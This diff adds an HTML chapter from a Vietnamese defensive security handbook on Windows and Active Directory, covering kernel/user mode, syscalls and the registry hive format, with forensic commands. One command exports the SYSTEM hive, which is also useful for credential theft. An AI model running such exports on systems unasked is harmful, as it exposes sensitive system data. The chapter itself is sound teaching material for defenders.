@@ -1,0 +1,1986 @@
+<!doctype html>
+<html lang="vi">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Chương 3 — Windows &amp;amp; Active Directory — Sổ tay An toàn thông tin</title>
+<meta name="description" content="Blog chia sẻ kiến thức an toàn thông tin — ghi chép trong quá trình học và làm việc.">
+<meta property="og:title" content="Chương 3 — Windows &amp;amp; Active Directory — Sổ tay An toàn thông tin">
+<meta property="og:description" content="Blog chia sẻ kiến thức an toàn thông tin — ghi chép trong quá trình học và làm việc.">
+<meta property="og:type" content="article">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>📓</text></svg>">
+<link rel="prev" href="ch02.html"><link rel="next" href="ch04.html">
+<script>(function(){var t=localStorage.getItem('kb-theme');if(t&&t!=='light')document.documentElement.setAttribute('data-theme',t);})();</script>
+<style>:root{--wibu-bg:url("assets/wibu-bg.jpg")}</style>
+<style>
+:root{
+  --bg:#f4efe3; --panel:#ebe3d1; --panel2:#e1d7c0; --ink:#2b2620; --muted:#79705e;
+  --line:#d6cbb3; --accent:#0f6e60; --accent2:#b1502c; --code-bg:#241f18; --code-ink:#ece3d1;
+  --tbl-head:#e6dcc5; --tbl-zebra:#efe8d6; --kbd:#e6dcc5; --codeborder:#3a3228; --scroll:#cabda2;
+  --serif:Georgia,"Iowan Old Style","Times New Roman",serif;
+}
+html[data-theme="dark"]{
+  --bg:#16140f; --panel:#1e1b15; --panel2:#2a261d; --ink:#e9e2d2; --muted:#9c917c;
+  --line:#322d23; --accent:#46b3a3; --accent2:#e0824f; --code-bg:#0e0c08; --code-ink:#e9e2d2;
+  --tbl-head:#2a261d; --tbl-zebra:#1c1914; --kbd:#2c271e; --codeborder:#322d23; --scroll:#3a3328;
+}
+html[data-theme="wibu"]{
+  --bg:#241a38; --panel:rgba(38,28,55,.74); --panel2:rgba(60,44,86,.72); --ink:#f4ecff; --muted:#cbb9e6;
+  --line:rgba(255,255,255,.15); --accent:#ff79b0; --accent2:#a78bff; --code-bg:rgba(15,10,25,.85); --code-ink:#f0e8ff;
+  --tbl-head:rgba(60,44,86,.72); --tbl-zebra:rgba(48,35,70,.45); --kbd:rgba(70,52,98,.7); --codeborder:rgba(255,255,255,.13); --scroll:#7a5fae;
+}
+html[data-theme="wibu"] body{
+  background-color:#241a38;
+  background-image:var(--wibu-bg, none), linear-gradient(135deg,#2a1e44 0%,#46315f 55%,#5a3f74 100%);
+  background-size:cover; background-position:center; background-attachment:fixed;
+}
+html[data-theme="wibu"] .sidebar,
+html[data-theme="wibu"] .brand,
+html[data-theme="wibu"] .search,
+html[data-theme="wibu"] .topbar{backdrop-filter:blur(12px);-webkit-backdrop-filter:blur(12px)}
+html[data-theme="wibu"] .main{background:rgba(18,12,30,.55);border:1px solid var(--line);border-radius:16px;
+  margin-top:20px;margin-bottom:20px;backdrop-filter:blur(4px);-webkit-backdrop-filter:blur(4px)}
+*{box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{margin:0;background:var(--bg);color:var(--ink);
+  font:16px/1.72 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,"Noto Sans",sans-serif;}
+a{color:var(--accent);text-decoration:none}
+a:hover{text-decoration:underline}
+
+.wrap{display:flex;min-height:100vh}
+.sidebar{width:322px;flex:0 0 322px;background:var(--panel);border-right:1px solid var(--line);
+  height:100vh;position:sticky;top:0;overflow-y:auto;padding:0}
+.brand{padding:20px 18px 13px;border-bottom:1px solid var(--line);position:sticky;top:0;background:var(--panel);z-index:2}
+.brand h1{font-family:var(--serif);font-size:19px;margin:0 0 3px;letter-spacing:.2px;color:var(--ink)}
+.brand .tag{margin:3px 0 0;font-size:11.5px;color:var(--muted);line-height:1.45}
+.brand .author{display:block;margin-top:7px;font-size:11.5px;color:var(--accent2);font-weight:600}
+.controls{display:flex;gap:7px;margin-top:11px}
+.ctrl-btn{display:inline-flex;align-items:center;justify-content:center;gap:5px;background:var(--bg);
+  border:1px solid var(--line);color:var(--ink);border-radius:7px;padding:5px 10px;font-size:12px;
+  cursor:pointer;font-family:inherit;line-height:1;text-decoration:none}
+.ctrl-btn:hover{border-color:var(--accent);text-decoration:none}
+.search{padding:10px 14px;position:sticky;top:118px;background:var(--panel);z-index:2;border-bottom:1px solid var(--line)}
+.search input{width:100%;background:var(--bg);border:1px solid var(--line);color:var(--ink);
+  border-radius:7px;padding:8px 10px;font-size:13px;outline:none}
+.search input:focus{border-color:var(--accent)}
+.nav{padding:8px 8px 40px}
+.nav-group{padding:16px 10px 5px;font-family:var(--serif);font-size:11px;font-weight:700;letter-spacing:.4px;
+  text-transform:uppercase;color:var(--accent2)}
+.nav-chapter{margin:1px 0}
+.nav-ch-title{display:flex;gap:9px;align-items:baseline;padding:7px 10px;border-radius:7px;color:var(--ink);font-size:13.5px}
+.nav-ch-title .num{font-family:var(--serif);font-size:11px;color:var(--muted);font-variant-numeric:tabular-nums;min-width:18px}
+.nav-ch-title:hover{background:var(--panel2);text-decoration:none}
+.nav-chapter.active>.nav-ch-title{background:var(--bg);box-shadow:inset 3px 0 0 var(--accent);color:var(--ink);font-weight:700}
+.nav-chapter.active>.nav-ch-title .num{color:var(--accent)}
+.nav-subs{display:none;margin:2px 0 6px 27px;border-left:1px solid var(--line);padding-left:9px}
+.nav-chapter.open .nav-subs{display:block}
+.nav-sub{display:block;padding:4px 8px;font-size:12px;color:var(--muted);border-radius:6px;line-height:1.4}
+.nav-sub:hover{color:var(--accent);background:var(--panel2);text-decoration:none}
+
+.content{flex:1;min-width:0;padding:0 0 120px}
+.topbar{display:none}
+.main{max-width:820px;margin:0 auto;padding:40px 44px}
+.chapter{border-bottom:1px solid var(--line);padding-bottom:44px;margin-bottom:14px}
+.chapter h1{font-family:var(--serif);font-size:31px;line-height:1.22;margin:40px 0 20px;padding-bottom:12px;
+  border-bottom:2px solid var(--accent);color:var(--ink);scroll-margin-top:16px}
+.chapter:first-child h1{margin-top:8px}
+h2{font-family:var(--serif);font-size:23px;margin:36px 0 12px;color:var(--ink);scroll-margin-top:16px}
+h3{font-family:var(--serif);font-size:18px;margin:24px 0 8px;color:var(--ink);scroll-margin-top:16px}
+h4{font-size:14px;margin:18px 0 6px;color:var(--accent);font-weight:700}
+p{margin:11px 0}
+ul,ol{margin:11px 0;padding-left:24px}
+li{margin:5px 0}
+strong{color:var(--ink);font-weight:700}
+hr{border:0;border-top:1px solid var(--line);margin:28px 0}
+blockquote{margin:15px 0;padding:9px 16px;border-left:3px solid var(--accent2);
+  background:var(--panel);border-radius:0 7px 7px 0;color:var(--muted)}
+
+code{font-family:"SF Mono","JetBrains Mono",Consolas,"Liberation Mono",monospace;font-size:13px}
+:not(pre)>code{background:var(--kbd);color:var(--accent2);padding:1.5px 6px;border-radius:5px;font-size:12.5px}
+pre{background:var(--code-bg);border:1px solid var(--codeborder);border-radius:9px;padding:14px 16px;
+  overflow-x:auto;margin:15px 0;line-height:1.55}
+pre code{color:var(--code-ink);background:none;padding:0;font-size:12.7px;white-space:pre}
+
+.tbl-scroll,table{width:100%}
+table{border-collapse:collapse;margin:16px 0;font-size:13.5px;display:block;overflow-x:auto}
+th,td{border:1px solid var(--line);padding:8px 11px;text-align:left;vertical-align:top}
+th{background:var(--tbl-head);color:var(--ink);font-weight:700;white-space:nowrap}
+tbody tr:nth-child(even){background:var(--tbl-zebra)}
+
+.menu-btn{display:none}
+@media(max-width:980px){
+  .sidebar{position:fixed;left:0;top:0;z-index:50;transform:translateX(-100%);transition:transform .25s}
+  .sidebar.show{transform:none;box-shadow:0 0 40px rgba(20,15,8,.45)}
+  .topbar{display:flex;align-items:center;gap:10px;position:sticky;top:0;z-index:40;
+    background:var(--panel);border-bottom:1px solid var(--line);padding:10px 16px}
+  .menu-btn{display:inline-flex;background:var(--bg);border:1px solid var(--line);color:var(--ink);
+    border-radius:7px;padding:7px 12px;font-size:14px;cursor:pointer}
+  .topbar .ttl{font-family:var(--serif);font-size:15px;font-weight:700;flex:1}
+  .main{padding:24px 18px}
+  .chapter h1{font-size:25px}
+}
+::-webkit-scrollbar{width:11px;height:11px}
+::-webkit-scrollbar-thumb{background:var(--scroll);border-radius:6px;border:2px solid var(--bg)}
+::-webkit-scrollbar-track{background:transparent}
+
+.site-foot{max-width:820px;margin:54px auto 0;padding:24px 44px 0;border-top:1px solid var(--line);
+  color:var(--muted);font-size:13px;line-height:1.7}
+.site-foot a{color:var(--accent)}
+.site-foot .name{color:var(--ink);font-weight:700}
+@media(max-width:980px){.site-foot{padding:24px 18px 0}}
+.brand h1 a{color:var(--ink);text-decoration:none}
+.brand h1 a:hover{color:var(--accent)}
+.nav-sub.here{color:var(--accent);background:var(--panel2);font-weight:600}
+.pager{max-width:820px;margin:34px auto 0;display:flex;gap:14px;justify-content:space-between}
+.pg{flex:1 1 0;min-width:0;display:block;padding:13px 16px;border:1px solid var(--line);border-radius:10px;
+  background:var(--panel);color:var(--ink);text-decoration:none}
+a.pg:hover{border-color:var(--accent);text-decoration:none}
+a.pg:hover b{color:var(--accent)}
+.pg span{display:block;font-size:11.5px;color:var(--muted);margin-bottom:3px}
+.pg b{display:block;font-size:13.5px;font-weight:600;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.pg.next{text-align:right}
+span.pg{border:0;background:none}
+@media(max-width:980px){.pager{padding:0 18px}}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <aside class="sidebar" id="sidebar">
+    <div class="brand"><h1><a href="notes.html">Sổ tay An toàn thông tin</a></h1>
+      <p class="tag">Chia sẻ kiến thức · ghi chép khi học &amp; làm</p>
+      <span class="author">✍️ Fee</span>
+      <div class="controls"><a class="ctrl-btn" href="./">🏠 Trang chủ</a><button class="ctrl-btn themeBtn" title="Sáng / Tối / Wibu">🌙</button><a class="ctrl-btn themeLink" href="en/notes.html">🌐 EN</a></div></div>
+    <div class="search"><input id="q" type="search" placeholder="Lọc mục lục…" autocomplete="off"></div>
+    <nav class="nav"><div class="nav-chapter" data-ch="00"><a class="nav-ch-title" href="notes.html"><span class="num">00</span><span class="t">Giới thiệu &amp; Mục lục</span></a><div class="nav-subs"></div></div><div class="nav-group">Phần A · Nền tảng</div><div class="nav-chapter" data-ch="01"><a class="nav-ch-title" href="ch01.html"><span class="num">01</span><span class="t">Mạng máy tính</span></a><div class="nav-subs"></div></div><div class="nav-chapter" data-ch="02"><a class="nav-ch-title" href="ch02.html"><span class="num">02</span><span class="t">Hệ điều hành Linux</span></a><div class="nav-subs"></div></div><div class="nav-chapter open active" data-ch="03"><a class="nav-ch-title" href="#top"><span class="num">03</span><span class="t">Windows &amp; Active Directory</span></a><div class="nav-subs"><a class="nav-sub" href="#ch03-tong-quan">Tổng quan</a><a class="nav-sub" href="#ch03-31-kien-truc-windows-kernel-mode-va-user-mode">3.1. Kiến trúc Windows: Kernel Mode và User Mode</a><a class="nav-sub" href="#ch03-32-registry-va-hive">3.2. Registry và Hive</a><a class="nav-sub" href="#ch03-33-process-thread-va-access-token">3.3. Process, Thread và Access Token</a><a class="nav-sub" href="#ch03-34-services-va-scheduled-tasks">3.4. Services và Scheduled Tasks</a><a class="nav-sub" href="#ch03-35-windows-event-log-cac-event-id-bao-mat-cot-loi">3.5. Windows Event Log — các Event ID bảo mật cốt lõi</a><a class="nav-sub" href="#ch03-36-sysmon-system-monitor">3.6. Sysmon — System Monitor</a><a class="nav-sub" href="#ch03-37-active-directory-cau-truc-luan-ly-va-vat-ly">3.7. Active Directory — Cấu trúc luận lý và vật lý</a><a class="nav-sub" href="#ch03-38-ldap-giao-thuc-truy-van-ad">3.8. LDAP — giao thức truy vấn AD</a><a class="nav-sub" href="#ch03-39-kerberos-xac-thuc-tung-buoc">3.9. Kerberos — xác thực từng bước</a><a class="nav-sub" href="#ch03-310-ntlm-challengeresponse">3.10. NTLM — Challenge/Response</a><a class="nav-sub" href="#ch03-311-tan-cong-active-directory-va-dau-hieu-event-id">3.11. Tấn công Active Directory và dấu hiệu Event ID</a><a class="nav-sub" href="#ch03-312-powershell-logging">3.12. PowerShell Logging</a><a class="nav-sub" href="#ch03-313-laps-va-mo-hinh-phan-tang-tiering">3.13. LAPS và Mô hình phân tầng (Tiering)</a><a class="nav-sub" href="#ch03-314-tong-ket-phong-thu-theo-lop">3.14. Tổng kết phòng thủ theo lớp</a><a class="nav-sub" href="#ch03-ghi-chu-cua-minh">Ghi chú của mình</a></div></div><div class="nav-chapter" data-ch="04"><a class="nav-ch-title" href="ch04.html"><span class="num">04</span><span class="t">Mật mã &amp; Nền tảng bảo mật</span></a><div class="nav-subs"></div></div><div class="nav-group">Phần B · An ninh ứng dụng &amp; DevSecOps</div><div class="nav-chapter" data-ch="05"><a class="nav-ch-title" href="ch05.html"><span class="num">05</span><span class="t">An ninh ứng dụng Web (OWASP)</span></a><div class="nav-subs"></div></div><div class="nav-chapter" data-ch="06"><a class="nav-ch-title" href="ch06.html"><span class="num">06</span><span class="t">DevSecOps &amp; Quét mã nguồn</span></a><div class="nav-subs"></div></div><div class="nav-chapter" data-ch="07"><a class="nav-ch-title" href="ch07.html"><span class="num">07</span><span class="t">CI/CD &amp; GitOps</span></a><div class="nav-subs"></div></div><div class="nav-group">Phần C · Giám sát, Phát hiện &amp; Ứng phó</div><div class="nav-chapter" data-ch="08"><a class="nav-ch-title" href="ch08.html"><span class="num">08</span><span class="t">SIEM &amp; Quản lý log</span></a><div class="nav-subs"></div></div><div class="nav-chapter" data-ch="09"><a class="nav-ch-title" href="ch09.html"><span class="num">09</span><span class="t">Observability &amp; Giám sát hạ tầng</span></a><div class="nav-subs"></div></div><div class="nav-chapter" data-ch="10"><a class="nav-ch-title" href="ch10.html"><span class="num">10</span><span class="t">Vận hành SOC &amp; Ứng phó sự cố</span></a><div class="nav-subs"></div></div><div class="nav-group">Phần D · Phòng thủ mạng &amp; Kiểm thử</div><div class="nav-chapter" data-ch="11"><a class="nav-ch-title" href="ch11.html"><span class="num">11</span><span class="t">Phòng thủ mạng (IDS/WAF/VPN)</span></a><div class="nav-subs"></div></div><div class="nav-chapter" data-ch="12"><a class="nav-ch-title" href="ch12.html"><span class="num">12</span><span class="t">Kiểm thử &amp; Đánh giá lỗ hổng</span></a><div class="nav-subs"></div></div><div class="nav-group">Phần E · Hạ tầng, Ảo hóa &amp; Đám mây</div><div class="nav-chapter" data-ch="13"><a class="nav-ch-title" href="ch13.html"><span class="num">13</span><span class="t">Bảo mật Đám mây</span></a><div class="nav-subs"></div></div><div class="nav-chapter" data-ch="14"><a class="nav-ch-title" href="ch14.html"><span class="num">14</span><span class="t">Ảo hóa &amp; Container</span></a><div class="nav-subs"></div></div><div class="nav-group">Phần F · Tấn công, Tuân thủ &amp; Tự động hóa</div><div class="nav-chapter" data-ch="15"><a class="nav-ch-title" href="ch15.html"><span class="num">15</span><span class="t">Threat Intel &amp; Khung tấn công</span></a><div class="nav-subs"></div></div><div class="nav-chapter" data-ch="16"><a class="nav-ch-title" href="ch16.html"><span class="num">16</span><span class="t">Tuân thủ &amp; Quản trị (GRC)</span></a><div class="nav-subs"></div></div><div class="nav-chapter" data-ch="17"><a class="nav-ch-title" href="ch17.html"><span class="num">17</span><span class="t">Lập trình &amp; Tự động hóa</span></a><div class="nav-subs"></div></div><div class="nav-group">Phụ lục</div><div class="nav-chapter" data-ch="99"><a class="nav-ch-title" href="ch99.html"><span class="num">99</span><span class="t">Thuật ngữ &amp; viết tắt</span></a><div class="nav-subs"></div></div></nav>
+  </aside>
+  <div class="content">
+    <div class="topbar"><button class="menu-btn" id="menu">☰</button><span class="ttl">Sổ tay An toàn thông tin</span>
+      <button class="ctrl-btn themeBtn" title="Sáng / Tối / Wibu">🌙</button><a class="ctrl-btn themeLink" href="en/notes.html">🌐 EN</a></div>
+    <main class="main" id="top">
+      <section class="chapter" id="sec-03" data-ch="03">
+<h1 id="ch03-chuong-3-windows-active-directory">Chương 3 — Windows &amp; Active Directory</h1>
+<h2 id="ch03-tong-quan">Tổng quan</h2>
+<p>Đa số môi trường doanh nghiệp mình từng đụng vào đều chạy Windows và nối vào một domain AD nào đó, nên với dân Blue Team, đây gần như là địa hình mặc định chứ không phải lựa chọn. Mình học chương này để trả lời một câu hỏi xuyên suốt: kẻ tấn công đi từ một máy trạm bị chiếm tới quyền quản trị toàn miền bằng con đường nào, và ở bước nào thì có dấu vết để bắt được.</p>
+<p>Chương bắt đầu từ tầng thấp nhất của một máy Windows đơn lẻ: ranh giới đặc quyền CPU giữa <strong>Kernel Mode</strong> và <strong>User Mode</strong> (nơi một driver Ring 0 có lỗ hổng trở thành đường leo quyền kiểu BYOVD), cách hệ thống lưu cấu hình trong <strong>Registry và Hive</strong> (khóa autostart là chỗ mã độc thích bám trụ nhất), rồi tới đơn vị thực thi và danh tính bảo mật — <strong>process, thread và access token</strong> — thứ hay bị đánh cắp hoặc mạo danh để leo quyền. Từ persistence trên một máy, chương mở rộng ra <strong>services</strong> và <strong>scheduled tasks</strong>, hai cơ chế vừa hợp pháp vừa bị lợi dụng phổ biến nhất cho lateral movement. Phần quan sát và điều tra đi cùng: <strong>Windows Event Log</strong> với các Event ID như 4624/4625 là nguồn bằng chứng chính, còn <strong>Sysmon</strong> bù lại những gì audit mặc định không thấy được.</p>
+<p>Nửa sau chương chuyển sang tầng domain, nơi <strong>Active Directory</strong> quản trị tập trung qua Domain, Forest, OU và GPO — chiếm được AD gần như đồng nghĩa kiểm soát cả tổ chức, và <strong>LDAP</strong> vừa là giao thức truy vấn thư mục vừa là công cụ recon lộ ý đồ tấn công qua các truy vấn bất thường. Hai giao thức xác thực được đặt cạnh nhau để thấy rõ vì sao chúng là mục tiêu: <strong>Kerberos</strong> dựa trên ticket (TGT rồi service ticket) là nền của Kerberoasting và Golden/Silver Ticket, còn <strong>NTLM</strong> — di sản challenge/response còn sót lại cho các ca legacy — mang điểm yếu thiết kế dẫn tới pass-the-hash và NTLM relay. Chương khép lại bằng phần <strong>tấn công Active Directory</strong>, nối toàn bộ khái niệm trên thành một chuỗi công–thủ có dấu vết Event ID đi kèm.</p>
+<blockquote>
+<p>Số liệu trong chương bám theo Microsoft Docs, các MS-* Open Specifications, RFC 4120/4178 và mã nguồn công khai của Sysinternals/Sysmon; chỗ nào chưa chắc được ghi "(cần kiểm chứng)".</p>
+</blockquote>
+<hr />
+<h2 id="ch03-31-kien-truc-windows-kernel-mode-va-user-mode">3.1. Kiến trúc Windows: Kernel Mode và User Mode</h2>
+<h3 id="ch03-311-la-gi">3.1.1. Là gì</h3>
+<p>Windows NT (nền tảng của mọi Windows hiện đại từ XP/2000 trở đi) chia không gian thực thi thành hai vòng (ring) đặc quyền của CPU x86/x64:</p>
+<ul>
+<li><strong>User mode (Ring 3)</strong>: nơi chạy tiến trình ứng dụng. Mỗi tiến trình có một <strong>không gian địa chỉ ảo (virtual address space)</strong> riêng, cô lập với tiến trình khác. Crash của một process không hạ cả hệ thống.</li>
+<li><strong>Kernel mode (Ring 0)</strong>: nơi chạy nhân hệ điều hành, driver thiết bị, và HAL. Toàn quyền truy cập phần cứng và toàn bộ RAM. Một lỗi ở đây (driver lỗi, dereference con trỏ NULL) gây <strong>BSOD (Bug Check)</strong>.</li>
+</ul>
+<p>Việc tách 2 ring là cơ chế phần cứng: trường <code>CPL</code> (Current Privilege Level, 2 bit) trong thanh ghi <code>CS</code> quyết định ring hiện tại. Lệnh đặc quyền (như <code>HLT</code>, ghi vào CR3) chỉ chạy được khi CPL=0.</p>
+<h3 id="ch03-312-co-che-ben-trong-bo-cuc-khong-gian-đia-chi-va-chuyen-ngu-canh">3.1.2. Cơ chế bên trong: bố cục không gian địa chỉ và chuyển ngữ cảnh</h3>
+<p>Trên Windows x64, không gian địa chỉ ảo 64-bit thực tế dùng 48 bit (canonical address), chia:</p>
+<table>
+<thead>
+<tr>
+<th>Vùng</th>
+<th>Khoảng địa chỉ (x64)</th>
+<th>Ý nghĩa</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>User space</td>
+<td><code>0x00000000'00000000</code> – <code>0x00007FFF'FFFFFFFF</code></td>
+<td>Code/heap/stack của process (≈128 TB)</td>
+</tr>
+<tr>
+<td>Vùng cấm (non-canonical)</td>
+<td><code>0x00008000'00000000</code> – <code>0xFFFF7FFF'FFFFFFFF</code></td>
+<td>Không hợp lệ, dùng để bắt lỗi</td>
+</tr>
+<tr>
+<td>Kernel space</td>
+<td><code>0xFFFF8000'00000000</code> – <code>0xFFFFFFFF'FFFFFFFF</code></td>
+<td>Nhân, driver, dùng chung mọi process (≈128 TB)</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Chuyển từ user → kernel</strong> xảy ra qua <strong>system call</strong>. Trên x64, hàm user-mode (ví dụ <code>NtCreateFile</code> trong <code>ntdll.dll</code>) nạp <strong>system service number (SSN)</strong> vào thanh ghi <code>EAX</code> rồi thực thi lệnh <code>syscall</code>:</p>
+<pre><code class="language-asm">; ntdll!NtCreateFile (rút gọn) — số SSN thay đổi theo từng build Windows
+mov  r10, rcx          ; syscall quy ước dùng r10 thay cho rcx
+mov  eax, 0x55         ; SSN của NtCreateFile (ví dụ — phải kiểm chứng theo build)
+syscall                ; chuyển CPL 3 -&gt; 0, nhảy vào KiSystemCall64
+ret
+</code></pre>
+<p>CPU đọc MSR <code>IA32_LSTAR</code> để biết entry point kernel (<code>nt!KiSystemCall64</code>), lưu RIP/RFLAGS, đặt CPL=0. Kernel dùng SSN làm index vào <strong>SSDT (System Service Descriptor Table)</strong> <code>KeServiceDescriptorTable</code> để gọi đúng hàm <code>Nt*</code>.</p>
+<blockquote>
+<p><strong>Vì sao:</strong> tách ring + chuyển ngữ cảnh có kiểm soát ngăn code user-mode tùy tiện đọc/ghi RAM kernel hay phần cứng — nền tảng của mọi cô lập bảo mật.</p>
+</blockquote>
+<h3 id="ch03-313-cac-thanh-phan-kernel-chinh">3.1.3. Các thành phần kernel chính</h3>
+<table>
+<thead>
+<tr>
+<th>Thành phần</th>
+<th>File</th>
+<th>Vai trò</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Executive</td>
+<td><code>ntoskrnl.exe</code></td>
+<td>Quản lý đối tượng, bộ nhớ ảo (Mm), I/O Manager, Process/Thread</td>
+</tr>
+<tr>
+<td>Kernel (microkernel)</td>
+<td><code>ntoskrnl.exe</code></td>
+<td>Lập lịch luồng, đồng bộ, ngắt (DPC/APC)</td>
+</tr>
+<tr>
+<td>HAL</td>
+<td><code>hal.dll</code></td>
+<td>Trừu tượng hóa phần cứng (timer, ngắt, bus)</td>
+</tr>
+<tr>
+<td>Win32k</td>
+<td><code>win32k.sys</code></td>
+<td>GDI/USER (đồ họa, cửa sổ) — bề mặt tấn công lớn</td>
+</tr>
+<tr>
+<td>Security Reference Monitor (SRM)</td>
+<td>trong <code>ntoskrnl.exe</code></td>
+<td>Kiểm tra quyền (access check), sinh audit log</td>
+</tr>
+</tbody>
+</table>
+<h3 id="ch03-314-luu-y-bao-mat">3.1.4. Lưu ý bảo mật</h3>
+<ul>
+<li><strong>PatchGuard (Kernel Patch Protection)</strong> trên x64 chống sửa SSDT/cấu trúc kernel — nhưng cũng buộc rootkit chuyển sang kỹ thuật khác (BYOVD — Bring Your Own Vulnerable Driver).</li>
+<li>Driver chạy Ring 0 → một driver ký hợp lệ nhưng có lỗ hổng (ví dụ cho phép đọc/ghi physical memory tùy ý) là vector leo thang quyền phổ biến. Blue Team theo dõi nạp driver qua Sysmon Event ID 6.</li>
+</ul>
+<hr />
+<h2 id="ch03-32-registry-va-hive">3.2. Registry và Hive</h2>
+<h3 id="ch03-321-la-gi">3.2.1. Là gì</h3>
+<p>Registry là CSDL phân cấp lưu cấu hình HĐH và ứng dụng. Cấu trúc logic gồm <strong>key</strong> (như thư mục), <strong>subkey</strong>, và <strong>value</strong> (cặp tên–kiểu–dữ liệu).</p>
+<p>Các <strong>root key</strong> (hive logic):</p>
+<table>
+<thead>
+<tr>
+<th>Root key</th>
+<th>Viết tắt</th>
+<th>Nguồn dữ liệu vật lý</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>HKEY_LOCAL_MACHINE</code></td>
+<td>HKLM</td>
+<td>Các hive file trong <code>C:\Windows\System32\config\</code> (SYSTEM, SOFTWARE, SAM, SECURITY)</td>
+</tr>
+<tr>
+<td><code>HKEY_CURRENT_USER</code></td>
+<td>HKCU</td>
+<td><code>NTUSER.DAT</code> trong profile user đang đăng nhập</td>
+</tr>
+<tr>
+<td><code>HKEY_USERS</code></td>
+<td>HKU</td>
+<td>NTUSER.DAT của mọi user đã nạp + <code>.DEFAULT</code></td>
+</tr>
+<tr>
+<td><code>HKEY_CLASSES_ROOT</code></td>
+<td>HKCR</td>
+<td>View hợp nhất của HKLM\Software\Classes + HKCU\Software\Classes</td>
+</tr>
+<tr>
+<td><code>HKEY_CURRENT_CONFIG</code></td>
+<td>HKCC</td>
+<td>Liên kết tới HKLM\SYSTEM\CurrentControlSet\Hardware Profiles\Current</td>
+</tr>
+</tbody>
+</table>
+<h3 id="ch03-322-co-che-ben-trong-đinh-dang-hive-file-regf">3.2.2. Cơ chế bên trong: định dạng hive file (regf)</h3>
+<p>Hive file dùng định dạng nhị phân với chữ ký <code>regf</code>. Cấu trúc gồm <strong>base block (header)</strong> dài 4096 byte (0x1000), theo sau là các <strong>hive bin (hbin)</strong> chứa các <strong>cell</strong>.</p>
+<p>Bố cục <strong>base block</strong> (regf header) — các trường quan trọng:</p>
+<table>
+<thead>
+<tr>
+<th>Offset</th>
+<th>Kích thước</th>
+<th>Trường</th>
+<th>Ý nghĩa</th>
+<th>Ví dụ</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0x000</td>
+<td>4 byte</td>
+<td>Signature</td>
+<td>Luôn là ASCII <code>regf</code> (0x66676572 little-endian)</td>
+<td><code>72 65 67 66</code></td>
+</tr>
+<tr>
+<td>0x004</td>
+<td>4 byte</td>
+<td>Primary sequence number</td>
+<td>Tăng khi bắt đầu ghi</td>
+<td><code>0x00000123</code></td>
+</tr>
+<tr>
+<td>0x008</td>
+<td>4 byte</td>
+<td>Secondary sequence number</td>
+<td>Tăng khi ghi xong; nếu ≠ primary → hive dirty</td>
+<td><code>0x00000123</code></td>
+</tr>
+<tr>
+<td>0x00C</td>
+<td>8 byte</td>
+<td>Last written timestamp</td>
+<td>FILETIME (100ns từ 1601)</td>
+<td><code>0x01D9...</code></td>
+</tr>
+<tr>
+<td>0x014</td>
+<td>4 byte</td>
+<td>Major version</td>
+<td>Thường 1</td>
+<td><code>0x00000001</code></td>
+</tr>
+<tr>
+<td>0x018</td>
+<td>4 byte</td>
+<td>Minor version</td>
+<td>Thường 3, 5, hoặc 6</td>
+<td><code>0x00000005</code></td>
+</tr>
+<tr>
+<td>0x020</td>
+<td>4 byte</td>
+<td>Root cell offset</td>
+<td>Offset (từ đầu hbin đầu tiên) tới root key node</td>
+<td><code>0x00000020</code></td>
+</tr>
+<tr>
+<td>0x028</td>
+<td>4 byte</td>
+<td>Length</td>
+<td>Tổng kích thước dữ liệu hive</td>
+<td><code>0x00100000</code></td>
+</tr>
+<tr>
+<td>0x1FC</td>
+<td>4 byte</td>
+<td>Checksum</td>
+<td>XOR của 508 byte đầu (mỗi 4-byte)</td>
+<td><code>0xABCD1234</code></td>
+</tr>
+</tbody>
+</table>
+<p>Mỗi <strong>hbin</strong> dài bội số 4096 byte, header chữ ký <code>hbin</code>. Bên trong là <strong>cell</strong>: 4 byte đầu là kích thước (signed int32; âm = đang dùng, dương = free). Các loại cell node:</p>
+<ul>
+<li><code>nk</code> (Key Node): một registry key. Chứa tên, timestamp, offset tới subkey-list, value-list, security (<code>sk</code>).</li>
+<li><code>vk</code> (Value Key): một value (tên, kiểu REG_*, offset/inline dữ liệu).</li>
+<li><code>sk</code> (Security Key): chứa <strong>SECURITY_DESCRIPTOR</strong> (DACL/SACL/owner) cho key.</li>
+<li><code>lf</code>/<code>lh</code>/<code>li</code>/<code>ri</code>: các dạng danh sách subkey (lh dùng hash để tra nhanh).</li>
+</ul>
+<pre><code>+--------- HIVE FILE (regf) ----------+
+| Base block (4096 byte)              |  &lt;- chữ ký &quot;regf&quot;
++-------------------------------------+
+| hbin #0 (4096 byte)                 |  &lt;- chữ ký &quot;hbin&quot;
+|   [cell: nk - ROOT KEY]             |
+|   [cell: sk - security descriptor]  |
+|   [cell: lh - subkey list]          |
+| hbin #1 ...                         |
+|   [cell: vk - value &quot;Start&quot;=2]      |
++-------------------------------------+
+</code></pre>
+<h3 id="ch03-323-vi-du-thuc-te">3.2.3. Ví dụ thực tế</h3>
+<p>Đọc giá trị khởi động dịch vụ và xuất hive offline để phân tích forensic:</p>
+<pre><code class="language-cmd">:: Xem cấu hình autostart của một service (Start=2 nghĩa là Automatic)
+reg query &quot;HKLM\SYSTEM\CurrentControlSet\Services\Dnscache&quot; /v Start
+::  Start    REG_DWORD    0x2
+
+:: Liệt kê các chương trình tự chạy khi logon (persistence phổ biến)
+reg query &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Run&quot;
+
+:: Xuất hive SYSTEM offline để phân tích bằng công cụ forensic
+reg save HKLM\SYSTEM C:\ir\SYSTEM.hiv
+</code></pre>
+<p>Phân tích offline bằng <code>RegRipper</code>/<code>reglookup</code> (Linux) hoặc PowerShell:</p>
+<pre><code class="language-powershell"># Liệt kê toàn bộ value Run với kiểu và dữ liệu
+Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' |
+  Format-List
+</code></pre>
